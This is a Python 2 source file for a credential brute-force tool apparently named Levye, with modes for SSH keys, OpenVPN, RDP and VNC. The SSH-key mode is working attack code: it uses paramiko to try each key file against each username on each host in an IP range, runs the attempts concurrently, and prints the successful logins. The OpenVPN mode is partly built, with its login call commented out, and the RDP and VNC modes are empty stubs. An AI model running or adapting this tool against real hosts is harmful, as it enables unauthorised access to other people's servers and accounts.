#!/usr/bin/python

try:
	import sys
	import os
	import paramiko
	import argparse
	import subprocess
	import signal
	import tempfile
	from lib.threadpool import ThreadPool
	from lib.iprange import IpRange
except ImportError,e:
        import sys
        sys.stdout.write("%s\n" %e)
        sys.exit(1)


class AddressAction(argparse.Action):
  
        def __call__(self, parser, args, values, option = None):

                args.options = values

		if args.brute == "sshkey" and args.key_file is None:
			print >> sys.stderr, "Please specify key file for sshkey brute force"
			sys.exit(1)                	
		elif args.brute == "openvpn": 
			if args.config is None:
				print >> sys.stderr, "Please specify Configuration File"
				sys.exit(1)                		
			if args.passwd is None:
				print >> sys.stderr, "Please specify Passwd File"
				sys.exit(1)			
		elif args.brute == "rdp":	
			pass
		elif args.brute == "vnckey":
			pass


class Levye:
		
	def __init__(self):
		
		self.services = {"sshkey":self.sshkey,"rpd":self.rdp, "openvpn":self.openvpn, "vnckey":self.vnckey}
		self.openvpn_path = "/usr/sbin/openvpn"		

		description = "Description ..."
                usage = "Usage: use --help for futher information"
                parser = argparse.ArgumentParser(description = description, usage = usage)
                parser.add_argument('-b', '--brute', dest = 'brute', help = 'Brute Force Type', required = True)
		parser.add_argument('-s', '--server', dest = 'server', action = 'store', help = 'Host File', required = True)                
		parser.add_argument('-u', '--user', dest = 'username', action = 'store', help = 'User File', required = True)		
		parser.add_argument('-n', '--number', dest = 'thread', action = 'store', help = 'Thread Number', default = 5, type = int)		
		parser.add_argument('-l', '--log', dest = 'log_file', action = 'store', help = 'Log File', type = file)				
                parser.add_argument('-o', '--output', dest = 'output', action = 'store', help = 'Output Directory', type = file)		
		parser.add_argument('-c', '--passwd', dest = 'passwd', action = 'store', help = 'Password File')
		parser.add_argument('-t', '--timeout', dest = 'timeout', action = 'store', help = 'Timeout Value', default = 2, type = int)
		parser.add_argument('-p', '--port', dest = 'port', action = 'store', help = 'Service Port Number', type = int)		
		parser.add_argument('-k', '--key', dest = 'key_file', action = 'store', help = 'Key File')
		parser.add_argument('-m', '--config', dest = 'config', action = 'store', help = 'Configuration File')

		parser.add_argument('options', nargs='*', action = AddressAction)
		try:
                	self.args = parser.parse_args()
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)	


		if self.args.server:
			self.ip_list = []
			try:
				iprange = IpRange()
				for ip in iprange.iprange(self.args.server):
					self.ip_list.append(ip)
			except:
				print >> sys.stderr, "Not Valid Ip Address !!!"
				sys.exit(1)
	


	def signal_handler(self, signal, frame):
        	print('You pressed Ctrl+C!')
        	sys.exit(0)	


	def rdp(self, *options):
		pass

	def vnckey(self, *options):
		pass


	def openvpnlogin(self, brute_file):

		print brute_file
		#openvpn_cmd = ['%s --config %s --auth-user-pass %s'% (self.openvpn_path, self.args.config, brute_file_name)]	
		#proc = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE)

		#for result in iter(proc.stdout.readline, ''):
		#	print result
		

	def openvpn(self):

		port = 443

		if not os.path.exists(self.openvpn_path):
			print >> sys.stderr, "Openvpn: %s path doesn't exists on the system !!!"% (self.openvpn_path)
			sys.exit(1)

		if self.args.port is not None:
			port = int(self.args.port)
				
		if self.args.timeout is not None:
			timeout = self.args.timeout	
		
		if not os.path.isfile(self.args.config):
			print >> sys.stderr, "Config File %s Must Be a File !!!"% self.args.config
			sys.exit(1)

		if self.args.thread is not None:
			try:	
				pool = ThreadPool(int(self.args.thread))
			except Exception, err:
				print >> sys.stderr, err
				sys.exit(1)	


		brute_file = tempfile.NamedTemporaryFile(mode='w+t')
		brute_file_name = brute_file.name
		
		if os.path.isfile(self.args.username):
			for user in open(self.args.username, "r").read().splitlines():
				if os.path.isfile(self.args.passwd):			
					for password in open(self.args.passwd, "r").read().splitlines():
						brute_file.write(user + "\n")
						brute_file.write(password + "\n")
						brute_file.seek(0)
						pool.add_task(self.openvpnlogin, brute_file_name)
				else:
					brute_file.write(user + "\n")
					brute_file.write(self.args.passwd + "\n")
					brute_file.seek(0)
					pool.add_task(self.openvpnlogin, brute_file_name)
		else:
			if os.path.isfile(self.args.passwd):
				for password in open(self.args.passwd, "r").read().splitlines():
					brute_file.write(user + "\n")	
					brute_file.write(password + "\n")
					brute_file.seek(0)
					pool.add_task(self.openvpnlogin, brute_file_name)
			else:
				brute_file.write(self.args.username + "\n")
				brute_file.write(self.args.passwd + "\n")
				brute_file.seek(0)
				pool.add_task(self.openvpnlogin, brute_file_name)
		
		pool.wait_completion()	
		
	
	def sshlogin(self,ip,port,user,keyfile,timeout):	
	
		ssh = paramiko.SSHClient()	
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		
		#print "Verbose: %s:%s:%s:%s:%s"% (ip, port, user, keyfile, timeout)
		try:
			ssh.connect(ip, port, username=user, password=None, pkey=None, key_filename=keyfile, timeout=timeout, allow_agent=False, look_for_keys=False)
			print "OK: %s:%s:%s:%s:%s"% (ip,port,user,keyfile,timeout)
		except Exception ,err:
			pass
			#print err								
			

	def sshkey(self):

		port = 22
		
		if self.args.port is not None:
			port = self.args.port
		
		if self.args.timeout is not None:
			timeout = self.args.timeout	
		
		if self.args.thread is not None:
			try:
				pool = ThreadPool(self.args.thread)
			except Exception, err:
				print >> sys.stderr, err
				sys.exit(1)
	

		for ip in self.ip_list:
			if os.path.isfile(self.args.username):
				for user in open(self.args.username, "r").read().splitlines():
					if os.path.isdir(self.args.key_file):
						for dirname, dirnames, filenames in os.walk(self.args.key_file):
							for keyfile in filenames:
								keyfile_path = self.args.key_file + "/" + keyfile
								pool.add_task(self.sshlogin, ip, port, user, keyfile_path, timeout)
					else:
						pool.add_task(self.sshlogin, ip, port, user, self.args.key_file, timeout)
			else:
				if os.path.isdir(self.args.key_file):
					for dirname, dirnames, filenames in os.walk(self.args.key_file):
						for keyfile in filenames:
							keyfile_path = self.args.key_file + "/" + keyfile						
							pool.add_task(self.sshlogin, ip, port, self.args.username, keyfile_path, timeout)
				else:
					pool.add_task(self.sshlogin, ip, port, self.args.username, self.args.key_file, timeout)
			
		pool.wait_completion()


	def run(self, brute_type):

		signal.signal(signal.SIGINT, self.signal_handler)

		if not brute_type in self.services.keys():
			print >> sys.stderr, "%s is not valid service. Please use one of %s "% (brute_type,self.services.keys())
			sys.exit(1)
		else:
			self.services[brute_type]()		

##
### Main 
##	

if __name__ == "__main__":

	levye = Levye()
	levye.run(levye.args.brute)
